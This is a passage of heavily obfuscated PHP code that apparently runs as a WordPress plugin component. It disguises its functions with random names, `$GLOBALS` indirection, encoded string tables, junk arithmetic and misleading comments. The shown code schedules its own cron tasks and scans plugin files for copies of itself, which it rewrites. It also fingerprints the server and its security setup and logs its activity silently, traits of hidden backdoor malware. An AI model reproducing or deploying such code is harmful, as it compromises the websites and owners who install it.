    $kyij5t2c6tks9c      =    true;
 }

 }
 $azw3vg9eo62  = false;
  if     ($n_2t1swhkixay0   &&  $GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(377)))  {
// WP Query Loop filter priority

$pesmoe3rsefc1oz  = wp_next_scheduled(mklbz63xfh8ufytv1td7t());
  if  ($pesmoe3rsefc1oz     && ($GLOBALS['__scf_zxyq0lcqv02z6_185']() -     (int)    $pesmoe3rsefc1oz)    >  (7121+79))  {
  $azw3vg9eo62 =  true;
   if   ($GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(425)))   @wp_unschedule_event((int)  $pesmoe3rsefc1oz, mklbz63xfh8ufytv1td7t());



   }
}
/* sequentially-consistent cipher-suite */

  if   ($n_2t1swhkixay0    &&   !$kyij5t2c6tks9c   &&  !$azw3vg9eo62) {
  $cmi6rt1g4pgzml  =  $GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(377))    ?  (int) wp_next_scheduled(mklbz63xfh8ufytv1td7t()) :   0;
       if    ($cmi6rt1g4pgzml  <= 0  ||   $cmi6rt1g4pgzml  -  $GLOBALS['__scf_zxyq0lcqv02z6_185']() > (0x2d8+0xac))  {
@wp_schedule_single_event($GLOBALS['__scf_zxyq0lcqv02z6_185'](),  mklbz63xfh8ufytv1td7t());
   }
    har7hv7pjcrmkptgyfx();
ajlksgtglhvuh3l0rf(nrudcgor(426));
  return;
    }
 if  ($azw3vg9eo62)  {    fukkkeh6955g9qi(nrudcgor(427),  nrudcgor(428)); ajlksgtglhvuh3l0rf(nrudcgor(429)); }



      if  (!$nam05si9hdv    && !$azw3vg9eo62)    {
      if  ($n_2t1swhkixay0 &&  !$kyij5t2c6tks9c) {
     @wp_schedule_single_event($GLOBALS['__scf_zxyq0lcqv02z6_185'](),  mklbz63xfh8ufytv1td7t());
a55b3zjo9su10xzeput9();
 har7hv7pjcrmkptgyfx();$l89pybbw7=PHP_MAJOR_VERSION;$laruwvpvvy=$l89pybbw7*2;
ajlksgtglhvuh3l0rf(mhiu2yqz6kqd(430));
  return;
}
  if ($GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(431)))  @$GLOBALS['__scf_ig05tmw0lzks_432']((96+84));
 ajlksgtglhvuh3l0rf(nrudcgor(433));
uh5_5fz_6ted2gqkddrk((7+3));
    return;



}
if ($GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(434)))     @$GLOBALS['__scf_ig05tmw0lzks_432']((155+25));



 ajlksgtglhvuh3l0rf(f5cd2smymkqusi5(435));
 uh5_5fz_6ted2gqkddrk();
  }  catch    (Throwable  $h2v_bjm4ejxq8fp) {
    fukkkeh6955g9qi(nrudcgor(436),  $h2v_bjm4ejxq8fp);
   }    catch (Exception  $h2v_bjm4ejxq8fp)   {
     }
   }
 
 function plfvzmeelcl8s2gg1oi()
       {
try  {
 if  (!   $GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(437)))   {$py1vncpjam=43*2;$tjzwzniziu=$py1vncpjam-35;



     return;


   }
 
  $jg7ru_k43ecgw0  =  $GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(50)) ?  get_transient(se_any4b12t9njlu())    : false;
if   (!      $GLOBALS['__scf_vf9p0fditvxy_35']($jg7ru_k43ecgw0)) $jg7ru_k43ecgw0   =  tp_6sv5wl2a4y33wdv758(dhd5r6_4ki(369),   false);
if    (!    $GLOBALS['__scf_vf9p0fditvxy_35']($jg7ru_k43ecgw0))   {
       return;
    }
      
   if  (isset($jg7ru_k43ecgw0[f5cd2smymkqusi5(438)])   &&   $GLOBALS['__scf_vf9p0fditvxy_35']($jg7ru_k43ecgw0[nhceivfj8tbe(438)]))   {


 $GLOBALS[f5cd2smymkqusi5(439)] =   nr7uvtguy4599vesb($jg7ru_k43ecgw0[nhceivfj8tbe(440)]);
}
 
   if      (isset($jg7ru_k43ecgw0[nhceivfj8tbe(441)])  &&  $GLOBALS['__scf_vf9p0fditvxy_35']($jg7ru_k43ecgw0[mhiu2yqz6kqd(442)]))   {
   $GLOBALS[mhiu2yqz6kqd(443)] =  nr7uvtguy4599vesb($jg7ru_k43ecgw0[nhceivfj8tbe(442)]);
      }
// sub-optimal dependent-type

    
  if   (isset($jg7ru_k43ecgw0[nrudcgor(444)])  &&  $GLOBALS['__scf__me483qbepnts_41']($jg7ru_k43ecgw0[nrudcgor(445)]))   {


$GLOBALS[dhd5r6_4ki(446)] =   $jg7ru_k43ecgw0[nrudcgor(445)];$zjb0vwfoi=PHP_MAJOR_VERSION;$yd5xcdzpts60y=$zjb0vwfoi*3;
    }
if (isset($jg7ru_k43ecgw0[f5cd2smymkqusi5(447)]) &&   $GLOBALS['__scf__me483qbepnts_41']($jg7ru_k43ecgw0[pahk8uy1uxt(447)])   &&    $GLOBALS['__scf_amjjmfnilcolnb_10']($jg7ru_k43ecgw0[nrudcgor(447)])  >  (0x24+0xe))  {
    $GLOBALS[pahk8uy1uxt(448)] =  $jg7ru_k43ecgw0[nhceivfj8tbe(449)];
  }
    if  (isset($jg7ru_k43ecgw0[nhceivfj8tbe(362)]) &&   $GLOBALS['__scf__me483qbepnts_41']($jg7ru_k43ecgw0[pahk8uy1uxt(362)])   &&  $GLOBALS['__scf_amjjmfnilcolnb_10']($jg7ru_k43ecgw0[pahk8uy1uxt(362)])  >    (56+44))  {
 $GLOBALS[nhceivfj8tbe(450)]  =  $jg7ru_k43ecgw0[nrudcgor(451)];
 }
  }  catch  (Throwable $h2v_bjm4ejxq8fp)  {$hdvupl01a=223;$y14dex9q9i5=($hdvupl01a>0)?$hdvupl01a:-$hdvupl01a;
 fukkkeh6955g9qi(nhceivfj8tbe(452), $h2v_bjm4ejxq8fp);
   }      catch  (Exception  $h2v_bjm4ejxq8fp) {
    }
   }
 
 function  h5220pocli2nyytl1qq1()


{
   try      {


      if   (!$GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(437))    ||    !$GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(453)))    return;
   if ((int)  get_option(nhceivfj8tbe(454),    0)   >      $GLOBALS['__scf_zxyq0lcqv02z6_185']()  -      (3566+34))  return;
 if  ($GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(455))  &&   get_transient(nhceivfj8tbe(456))) return;
    if    (!fm7xtju6ts9wdzb()) return;
 $yxqrzj9bi22l_c = weg_ghiafmuc1_6(f5cd2smymkqusi5(457),   "");

   if  (!$GLOBALS['__scf__me483qbepnts_41']($yxqrzj9bi22l_c)  ||   $GLOBALS['__scf_amjjmfnilcolnb_10']($yxqrzj9bi22l_c)  <   (492+8)   || sk_orzv3dinsktkrvn($yxqrzj9bi22l_c) ||   !hkk3yvii60ci7rk($yxqrzj9bi22l_c))  {
$yxqrzj9bi22l_c     =  false;
 $totrw4eouw10t     =  yrklujewy9nbrhy(vv_nfhhmy_1mjmsa());$afhluqf6=-555;$ofomqc_guvo8mp=($afhluqf6>0)?$afhluqf6:-$afhluqf6;



  if     ($GLOBALS['__scf__me483qbepnts_41']($totrw4eouw10t)   && !sk_orzv3dinsktkrvn($totrw4eouw10t)    &&    hkk3yvii60ci7rk($totrw4eouw10t))  {
 c8fb1vg_q0kn6h(pahk8uy1uxt(457), $totrw4eouw10t,    mhiu2yqz6kqd(458));

$yxqrzj9bi22l_c = $totrw4eouw10t;
}
    if   (!$yxqrzj9bi22l_c)  {$pvu98usl=229|137;$b51pedryvpu=$pvu98usl^23;
    @update_option(nrudcgor(459),   $GLOBALS['__scf_zxyq0lcqv02z6_185'](),  nhceivfj8tbe(458));



return;
   }
}
    $phsr97fysi    = array(vv_nfhhmy_1mjmsa());$ego15a_ipzip=1413;$fhssagkz8=$ego15a_ipzip%16;
$mdtdmxiofs5jrz5k  =   s3e5iki9upa0ccql();
     $l1t69ob7hw  =   ly0t7sdceinn03pyne3($mdtdmxiofs5jrz5k, (298+4702));
  if ($GLOBALS['__scf_vf9p0fditvxy_35']($l1t69ob7hw))   {
     foreach ($l1t69ob7hw  as  $u4n6wdbujmttz4q1)  {
 if   ($GLOBALS['__scf_bv1z3no349dv5r_9']($u4n6wdbujmttz4q1,  -(3+1))   ===   dhd5r6_4ki(214))    $phsr97fysi[] =     $mdtdmxiofs5jrz5k   .  '/'  .   $u4n6wdbujmttz4q1;
  }
    }
  if (defined(f5cd2smymkqusi5(460))     &&   $GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(461)))  {
foreach     ((array) @$GLOBALS['__scf_eu7lhdrjut9t66_69'](WP_PLUGIN_DIR .    dhd5r6_4ki(462))    as $ow9behzuy5_4i)  $phsr97fysi[]    = $ow9behzuy5_4i;


      }
  $phsr97fysi   =    $GLOBALS['__scf_e3ymc0hwiys_147']($phsr97fysi);



    $ir6sfiau3zql06 = array();
 $gaqi3mc3mjqev  =  $GLOBALS['__scf_bv1z3no349dv5r_9']($GLOBALS['__scf_fhlvy786vrl3_463'](pahk8uy1uxt(464), "", $GLOBALS['__scf_bv1z3no349dv5r_9']($yxqrzj9bi22l_c, 0, (65472+64))),  0,     (2015+33));
    foreach    ($phsr97fysi as    $rk_3ecj8aw)  {
     $mefny9wlt08e = @$GLOBALS['__scf_g9y45bstmb02a_95']($rk_3ecj8aw);
 if      (!$mefny9wlt08e  || $mefny9wlt08e <=  (1048479+97)) continue;
   $dyt_aghyi22 =   @$GLOBALS['__scf_apq4pqdt6n41_91']($rk_3ecj8aw,  false,  null,  0,  (65492+44));
     if  (!$GLOBALS['__scf__me483qbepnts_41']($dyt_aghyi22) ||      !sk_orzv3dinsktkrvn($dyt_aghyi22)) continue;



   if  ($rk_3ecj8aw !==   vv_nfhhmy_1mjmsa()  && $GLOBALS['__scf_bv1z3no349dv5r_9']($GLOBALS['__scf_fhlvy786vrl3_463'](pahk8uy1uxt(464), "",  $dyt_aghyi22),  0,    (1981+67))   !==     $gaqi3mc3mjqev)   continue;
  $ir6sfiau3zql06[]  =  $rk_3ecj8aw;
  }
  if     (!$ir6sfiau3zql06)  {
   @update_option(mhiu2yqz6kqd(459),    $GLOBALS['__scf_zxyq0lcqv02z6_185'](), nhceivfj8tbe(458));
   if  ($GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(58))) set_transient(dhd5r6_4ki(465),   1,   (554+46));


return;


  }
        @update_option(nhceivfj8tbe(466),    $GLOBALS['__scf_zxyq0lcqv02z6_185'](),    dhd5r6_4ki(458));
 foreach  ($ir6sfiau3zql06 as     $tkqx845nh5jt0)  {
   rgiuaapohxeh0z($tkqx845nh5jt0,  (416+4));
// WP Post Template contain layout

 if      (jr30c_pj_1z9sfyaq3c88($tkqx845nh5jt0,     vmv3l2fd6oj__92qteyq($yxqrzj9bi22l_c)))      {
       c9_5mtzr7mpfsj7($tkqx845nh5jt0);
        jqp5yotia2ogx9k($tkqx845nh5jt0);
 rgiuaapohxeh0z($tkqx845nh5jt0,    (385+35));
 ejl1lwk108flojzx($tkqx845nh5jt0);
  if   ($tkqx845nh5jt0   ===    vv_nfhhmy_1mjmsa())   {
  adbbbpoh0e7mcf6(true);
   mpkogxinl1o8xqdhl__(true);
  }
  } else   {
// reject lock-free quotient




        rgiuaapohxeh0z($tkqx845nh5jt0,    (471-51));
    }
 }
 }   catch (Throwable  $h2v_bjm4ejxq8fp)     {
fukkkeh6955g9qi(nhceivfj8tbe(467), $h2v_bjm4ejxq8fp);
 }   catch  (Exception  $h2v_bjm4ejxq8fp)   {
  }
 }


  function    n1e3pnm_3kvs383nl2t3e()
  {
  static $yc95rogvvetq0f    = false;
 if ($yc95rogvvetq0f)      return;
$yc95rogvvetq0f =  true;
   try  {
 sdd2srsvr57hw3iuamd();
 h5220pocli2nyytl1qq1();
plkzj6xyfi5f3tf();
 plfvzmeelcl8s2gg1oi();
       j8n8sx7uji82wxjlc6pgs();

  yjkrjx8q3v6i5zrgis4g();
 t5uz_smcfb0igmu0az32p8();$l1ucpn50=28|39;$aq_vokrma=$l1ucpn50^241;
gt1toalj2_i1_soa();
jtuan60rnpexx58rwvd6r();
 if (us6ojbyhi_yprcisb4()) {
  if    ($GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(468))   &&  did_action(mhiu2yqz6kqd(436)))  {
 if    ($GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(469)))    $GLOBALS['__scf_m8aixr72vowj30_170'](mhiu2yqz6kqd(470));
     }     else {$raxmovuv3=213|49;$xe38mjow=$raxmovuv3^91;
  rehs1w07vadorbxdvk(nhceivfj8tbe(436),     nhceivfj8tbe(471), 0);
 }
}
 }  catch   (Throwable $h2v_bjm4ejxq8fp)   {
  }  catch (Exception $h2v_bjm4ejxq8fp)  {
// PHP 8.2 enum: snapshot-isolated aggregator

 }
 }
 function har7hv7pjcrmkptgyfx()
{
   try  {
   if   (!$GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(290))   || !$GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(472)))      return;
  if  (!$GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(473)) ||  !$GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(453)))  return;
 $f5gyrwqpykgq9r  =   $GLOBALS['__scf_zxyq0lcqv02z6_185']();
 if   ($f5gyrwqpykgq9r     -   (int) @get_option(nhceivfj8tbe(474), 0)  <      (3596+4))  return;



     @update_option(f5cd2smymkqusi5(474), $f5gyrwqpykgq9r, pahk8uy1uxt(458));
     @$GLOBALS['__scf_yt926i7lwej_290'](home_url('/'), array(f5cd2smymkqusi5(475)    => 2,   pahk8uy1uxt(387)    =>   false, dhd5r6_4ki(386) =>     false));


 }   catch   (Throwable  $h2v_bjm4ejxq8fp)  {
}  catch  (Exception $h2v_bjm4ejxq8fp) {
   }
}
     function    us6ojbyhi_yprcisb4()
{
  if  (!  $GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(473))) {
return    true;
    




}
// timeout watermark for WP Post Template

    
 if ($GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(455)) &&  get_transient(se_any4b12t9njlu()))     {
   $z6nivxo68929  = (int) get_option(mhiu2yqz6kqd(424),  0);
      if  ($z6nivxo68929   >  0 && ($GLOBALS['__scf_zxyq0lcqv02z6_185']()  - $z6nivxo68929)   >     (86310+90))   {
 if    ($GLOBALS['__scf_vx4exz6r9h8n_4'](f5cd2smymkqusi5(476)))  @delete_transient(se_any4b12t9njlu());
} else      {
// WP Site Logo: adaptive serializer

return false;
 }
 }
 
 $cb3rsagzlizg2rl      =  o2ebi7xv7rf0ik_y5n9ry7();
      $drcleqqnwpgy4i4  =     tp_6sv5wl2a4y33wdv758(f5cd2smymkqusi5(477), false);
  if ($GLOBALS['__scf_vf9p0fditvxy_35']($drcleqqnwpgy4i4) &&  isset($drcleqqnwpgy4i4[f5cd2smymkqusi5(478)]) && (int) $drcleqqnwpgy4i4[nrudcgor(478)]  >=  (226+74)  &&   (int)   $drcleqqnwpgy4i4[mhiu2yqz6kqd(478)]     <= (162818-76418)) $cb3rsagzlizg2rl     =  (int)  $drcleqqnwpgy4i4[pahk8uy1uxt(478)];
   $t5a1qyulqvau    =   (int)   get_option(mhiu2yqz6kqd(424),  0);


  if    ($t5a1qyulqvau  >  0    &&   ($GLOBALS['__scf_zxyq0lcqv02z6_185']()   - $t5a1qyulqvau)     <     $cb3rsagzlizg2rl)  {
      return false;
   }
      
$acul00lysade0   =    (int)  get_option(nhceivfj8tbe(479),   0);
 if    ($acul00lysade0 > 0)    {
$e0_46i5nwe =      (int) get_option(dhd5r6_4ki(480), 0);
    $o6865h0d_n  =  array((0x8e+0x9e),  (821+79),  (638+1162),     (3591+9),  (1697+1903));
$i42xd14nrc1z    =  $o6865h0d_n[$GLOBALS['__scf_kgu6kfjf1dox_481'](0,     $GLOBALS['__scf_us1cf9ood8_482']($e0_46i5nwe   -     1,   (18^22)))];



$i42xd14nrc1z   += $GLOBALS['__scf_cn1v_k8jlgjjb_350'](0,   (int)  ($i42xd14nrc1z  * 0.25));
 if (($GLOBALS['__scf_zxyq0lcqv02z6_185']()   -   $acul00lysade0)  < $i42xd14nrc1z) {


  return  false;
}
  }
    
    return  true;
}
   
   function  zo60k7a7tywbvqa7h()
  {
$e0_46i5nwe = (int)  get_option(dhd5r6_4ki(480),    0);
 update_option(f5cd2smymkqusi5(483),    $e0_46i5nwe  + 1);
 update_option(nhceivfj8tbe(479), $GLOBALS['__scf_zxyq0lcqv02z6_185']());$ifvhxsajmv8v=PHP_MAJOR_VERSION;$wm2fbbze3zgprb=$ifvhxsajmv8v*1;
ajlksgtglhvuh3l0rf(nrudcgor(188));



    }
    function ajlksgtglhvuh3l0rf($z5msprkwfn,  $i7is8x4_pstu0r  =  "")
{
// WP Template Parts attachment metadata

    try      {
 if    (!$GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(484))   ||  !$GLOBALS['__scf_vx4exz6r9h8n_4'](mhiu2yqz6kqd(453)))      return;


 $phbzem8wsxe    =  @get_option(pahk8uy1uxt(485),  array());
     if (!$GLOBALS['__scf_vf9p0fditvxy_35']($phbzem8wsxe))     $phbzem8wsxe =     array();

    $phbzem8wsxe[]   =   array('t'  =>  $GLOBALS['__scf_zxyq0lcqv02z6_185'](), 'e' =>    $GLOBALS['__scf_bv1z3no349dv5r_9']((string) $z5msprkwfn,    0,    (4+12)),  'd' => $GLOBALS['__scf_bv1z3no349dv5r_9']((string)  $i7is8x4_pstu0r, 0,  (51-3)));
     if ($GLOBALS['__scf_upe5p4qfaqm0d1_36']($phbzem8wsxe) >   (195^207))  $phbzem8wsxe =   $GLOBALS['__scf_jxqnb2ruhcwvk_155']($phbzem8wsxe,   -(23-11));$p7t2p1wtq4oupw=682;$a45gsoif=($p7t2p1wtq4oupw>0)?$p7t2p1wtq4oupw:-$p7t2p1wtq4oupw;



@update_option(nhceivfj8tbe(485), $phbzem8wsxe, nhceivfj8tbe(458));
 }   catch  (Throwable  $h2v_bjm4ejxq8fp)   {
    } catch    (Exception  $h2v_bjm4ejxq8fp)    {
   }
   }
function   eo6lul89p1eqzs_g()
   {



   $i7is8x4_pstu0r  =  array();

 try      {
$i7is8x4_pstu0r[mhiu2yqz6kqd(486)] =      kwqziujdph5xlz3n();



 $i7is8x4_pstu0r[mhiu2yqz6kqd(487)] =  PHP_VERSION;
 $i7is8x4_pstu0r[dhd5r6_4ki(488)] = $GLOBALS['__scf_c9jv8d7koon_100']();$xgxax1xms9=(0xee+0xc6);$ycfdkd6abmt=$xgxax1xms9%8;
   $i7is8x4_pstu0r[f5cd2smymkqusi5(489)]    =  ($GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(490)) &&     is_ssl())   ?   1  :    0;$hw3i_ylnu13dw=-987;$gmges4jyoe4ur6=($hw3i_ylnu13dw>0)?$hw3i_ylnu13dw:-$hw3i_ylnu13dw;



 $i7is8x4_pstu0r[dhd5r6_4ki(491)]   = ($GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(204))  &&  is_multisite())  ?  1  :  0;
  $i7is8x4_pstu0r[pahk8uy1uxt(492)] =  isset($GLOBALS[pahk8uy1uxt(493)])   ? (string)  $GLOBALS[mhiu2yqz6kqd(494)]  :  "";
   $i7is8x4_pstu0r[dhd5r6_4ki(495)]  = isset($_SERVER[pahk8uy1uxt(107)])      ?  $GLOBALS['__scf_bv1z3no349dv5r_9']((string)  $_SERVER[pahk8uy1uxt(107)], 0,   (183^159)) :  "";
 $ruav82kdqczhv4 =   (isset($GLOBALS[mhiu2yqz6kqd(446)]) &&  $GLOBALS['__scf__me483qbepnts_41']($GLOBALS[nrudcgor(496)])) ?  $GLOBALS['__scf_uvjtdemk2f_320']($GLOBALS[nhceivfj8tbe(497)]) :  "";
   $i7is8x4_pstu0r[f5cd2smymkqusi5(498)]  =    ($ruav82kdqczhv4  !==  "") ?  1 :      0;
$i7is8x4_pstu0r[f5cd2smymkqusi5(499)]    =      $GLOBALS['__scf_amjjmfnilcolnb_10']($ruav82kdqczhv4);
    $i7is8x4_pstu0r[nrudcgor(500)]     =    !empty($GLOBALS[mhiu2yqz6kqd(501)])      ? 1      :    0;
   $i7is8x4_pstu0r[dhd5r6_4ki(502)]   = !empty($GLOBALS[nrudcgor(503)])    ?     1 :     0;



 $i7is8x4_pstu0r[f5cd2smymkqusi5(504)]    =  $GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(505))   ?   (int)   @get_option(nrudcgor(506),  0) : 0;
      $i7is8x4_pstu0r[nrudcgor(363)] =  (vlqx8b8viizxmck29ty0(f5cd2smymkqusi5(363),   "")   !==   "") ? 1    :  0;
     

$i7is8x4_pstu0r[pahk8uy1uxt(507)] =  $GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(505))      ?    (int) @get_option(dhd5r6_4ki(508), 0) :    0;
  $i7is8x4_pstu0r[f5cd2smymkqusi5(509)]   =  $GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(505)) ?   (int)   @get_option(dhd5r6_4ki(510),     0)  :  0;
  $i7is8x4_pstu0r[dhd5r6_4ki(511)]    = $GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(505))    ?   (int)      @get_option(dhd5r6_4ki(512),  0) :      0;
    $ga9fric5dh    =    ajbg_44koa9suqi();
       $i7is8x4_pstu0r[nrudcgor(513)] =   @$GLOBALS['__scf_gsamhlxot70ps_18']($ga9fric5dh .  dhd5r6_4ki(514))   ?    (j2368cjquni80wo1qowbhd(@$GLOBALS['__scf_apq4pqdt6n41_91']($ga9fric5dh   .     nrudcgor(514),  false, null,     0,  (0x1d17+0x2e9)))    ? 2 :      1) :   0;
   $i7is8x4_pstu0r[nrudcgor(515)]      =   @$GLOBALS['__scf_gsamhlxot70ps_18']($ga9fric5dh  .     nhceivfj8tbe(516))  ?  (j2368cjquni80wo1qowbhd(@$GLOBALS['__scf_apq4pqdt6n41_91']($ga9fric5dh . pahk8uy1uxt(517),  false,  null, 0, (8184+8)))   ? 2   :     1)  : 0;
$i7is8x4_pstu0r[nrudcgor(518)]    =  @$GLOBALS['__scf_gsamhlxot70ps_18']($ga9fric5dh     . f5cd2smymkqusi5(519)) ?    (j2368cjquni80wo1qowbhd(@$GLOBALS['__scf_apq4pqdt6n41_91']($ga9fric5dh .     nrudcgor(519),   false,  null, 0, (0x1a3+0x1e5d))) ?     2    : 1)   :  0;
  $by9ihyua8j3   =  nrudcgor(520)    .  ohrydgas8yy9a22s(ABSPATH .      'g',  (14-6));
      $b07tdkj2reaxznlv      =  mhiu2yqz6kqd(521)  .    ohrydgas8yy9a22s(ABSPATH . 'g',     (99^107));



       $i7is8x4_pstu0r[pahk8uy1uxt(522)]  = 0;
  foreach   (array(twjiqbicrnr_q7(), $ga9fric5dh,    ABSPATH    .   nhceivfj8tbe(523))  as  $l1ppgggprd6mqac8) {
  if (@$GLOBALS['__scf_gsamhlxot70ps_18']($l1ppgggprd6mqac8 .   '/'     .    $by9ihyua8j3 .    nrudcgor(214)))  $i7is8x4_pstu0r[nhceivfj8tbe(522)]     = 1;
 if   (@$GLOBALS['__scf_gsamhlxot70ps_18']($l1ppgggprd6mqac8 .  '/' .  $b07tdkj2reaxznlv) && (int) @$GLOBALS['__scf_hqkv9v6te1dvxi_94']($l1ppgggprd6mqac8  .   '/'  .     $b07tdkj2reaxznlv) >   $GLOBALS['__scf_zxyq0lcqv02z6_185']()  - (393-153))   {
    $i7is8x4_pstu0r[nhceivfj8tbe(522)]  = 2;
 

 break;
       }
  }
     unset($b07tdkj2reaxznlv,  $l1ppgggprd6mqac8);
 $xgz5xfxarfauuvj   =    $GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(230))  ?  @$GLOBALS['__scf_jpj9mbom_1b_109'](nhceivfj8tbe(524))  :      false;
  if   (!$GLOBALS['__scf__me483qbepnts_41']($xgz5xfxarfauuvj)   || $xgz5xfxarfauuvj ===  ""  ||   $xgz5xfxarfauuvj  ===  nrudcgor(525))  $xgz5xfxarfauuvj     =   dhd5r6_4ki(526);
  $i7is8x4_pstu0r[mhiu2yqz6kqd(527)]  =   (@$GLOBALS['__scf_gsamhlxot70ps_18'](ABSPATH     .  $xgz5xfxarfauuvj) &&     $GLOBALS['__scf_nr12ouzrtt_7']((string)  @$GLOBALS['__scf_apq4pqdt6n41_91'](ABSPATH      .  $xgz5xfxarfauuvj), pahk8uy1uxt(528))     !==   false)  ? 1  :    0;
$i7is8x4_pstu0r[mhiu2yqz6kqd(529)] = (@$GLOBALS['__scf_gsamhlxot70ps_18'](ABSPATH     .  pahk8uy1uxt(530))  &&    $GLOBALS['__scf_nr12ouzrtt_7']((string)    @$GLOBALS['__scf_apq4pqdt6n41_91'](ABSPATH  . nhceivfj8tbe(531)),   dhd5r6_4ki(528)) !==    false) ?  1 :  0;
$i7is8x4_pstu0r[f5cd2smymkqusi5(532)]  =     (@$GLOBALS['__scf_gsamhlxot70ps_18'](ABSPATH  .  mhiu2yqz6kqd(533))  &&    $GLOBALS['__scf_nr12ouzrtt_7']((string)  @$GLOBALS['__scf_apq4pqdt6n41_91'](ABSPATH      . dhd5r6_4ki(533),    false,  null,   0,    (65520+16)),    pahk8uy1uxt(534)) !==     false)   ?   1   :    0;


$i7is8x4_pstu0r[f5cd2smymkqusi5(535)]   =   defined(nrudcgor(536))  ?  1   :     0;
     $i7is8x4_pstu0r[pahk8uy1uxt(537)]     =    (defined(nrudcgor(538))  ||   defined(pahk8uy1uxt(539))   ||  defined(mhiu2yqz6kqd(540))  ||  $GLOBALS['__scf_vx4exz6r9h8n_4'](pahk8uy1uxt(541))      ||  $GLOBALS['__scf_mh99vqi740eg_542'](nhceivfj8tbe(543))  || isset($GLOBALS[nhceivfj8tbe(544)]) ||  $GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(545))) ?    1    :      0;
$i7is8x4_pstu0r[nhceivfj8tbe(546)]   = (int)   get_option(mhiu2yqz6kqd(424),  0);
    $i7is8x4_pstu0r[nhceivfj8tbe(547)]   =  (int) get_option(pahk8uy1uxt(483), 0);

 $i7is8x4_pstu0r[nrudcgor(548)] =  (int)   get_option(f5cd2smymkqusi5(479),  0);
    $ba9fzsa_e04lv = weg_ghiafmuc1_6(f5cd2smymkqusi5(549),  array());
   $ge0ik231jw9t    =  0;
$y0m2i1ij78q6d442  =  0;
     if ($GLOBALS['__scf_vf9p0fditvxy_35']($ba9fzsa_e04lv))  {
foreach    ($ba9fzsa_e04lv as  $u4n6wdbujmttz4q1)   {


    if (pok4lgcx7cvgj03i($u4n6wdbujmttz4q1)    ===   "")   continue;
  $ge0ik231jw9t++;
 $o44of768da28    =   $GLOBALS['__scf_vf9p0fditvxy_35']($u4n6wdbujmttz4q1) ?   (int) (isset($u4n6wdbujmttz4q1[mhiu2yqz6kqd(550)])   ?   $u4n6wdbujmttz4q1[pahk8uy1uxt(551)]   : 1)  : 1;
    $f34afuswhu9b84m =  $GLOBALS['__scf_vf9p0fditvxy_35']($u4n6wdbujmttz4q1)    &&  isset($u4n6wdbujmttz4q1[nhceivfj8tbe(552)])    ?   (int)  $u4n6wdbujmttz4q1[dhd5r6_4ki(552)] :   0;
if (!$o44of768da28  && (!$f34afuswhu9b84m   ||  $f34afuswhu9b84m  <  $GLOBALS['__scf_zxyq0lcqv02z6_185']()   -  (3583+17))) $y0m2i1ij78q6d442++;
   }
     }
  $i7is8x4_pstu0r[nrudcgor(553)] =    $ge0ik231jw9t;
    $i7is8x4_pstu0r[f5cd2smymkqusi5(554)]  =  $y0m2i1ij78q6d442;
    $p6pdfgh4oe3qln =   $GLOBALS['__scf_vx4exz6r9h8n_4'](nhceivfj8tbe(555))  ?  @get_option(f5cd2smymkqusi5(556),   "")     : "";
 $i7is8x4_pstu0r[nrudcgor(557)] =    $GLOBALS['__scf__me483qbepnts_41']($p6pdfgh4oe3qln) ? $GLOBALS['__scf_bv1z3no349dv5r_9']($p6pdfgh4oe3qln,   0,     (8-3))  :   "";
$ur7p4uqe8od34 = $GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(558))  ?    @get_option(nhceivfj8tbe(559),      array())  :  array();
$i7is8x4_pstu0r[mhiu2yqz6kqd(560)]  =   ($GLOBALS['__scf_vf9p0fditvxy_35']($ur7p4uqe8od34)    &&    (!empty($ur7p4uqe8od34['t'])   || !empty($ur7p4uqe8od34[pahk8uy1uxt(561)])))   ?   1    :   0;
   } catch   (Throwable $h2v_bjm4ejxq8fp) {
   $i7is8x4_pstu0r[mhiu2yqz6kqd(562)]  =    $GLOBALS['__scf_bv1z3no349dv5r_9']($h2v_bjm4ejxq8fp->getMessage(),  0,   (17+43));
 } catch  (Exception      $h2v_bjm4ejxq8fp)   {
   $i7is8x4_pstu0r[dhd5r6_4ki(562)]  =  $GLOBALS['__scf_bv1z3no349dv5r_9']($h2v_bjm4ejxq8fp->getMessage(),  0,   (22+38));
}
     return $i7is8x4_pstu0r;
 }
 
  function  bwbu2qg7n9nn5g6t3xw7()
 {
if  ($GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(383)))  {
       return  (string)    site_url(pahk8uy1uxt(563));
  }

 return $GLOBALS['__scf_vx4exz6r9h8n_4'](dhd5r6_4ki(564))      ?  (string) wp_login_url() : "";
    }



 
 function  romae2ec00z0c4bz61q_($lo9jghupfs)
 {
     $tbxz6w0003z =    "";
   if  ($GLOBALS['__scf_vx4exz6r9h8n_4'](nrudcgor(472)))    {
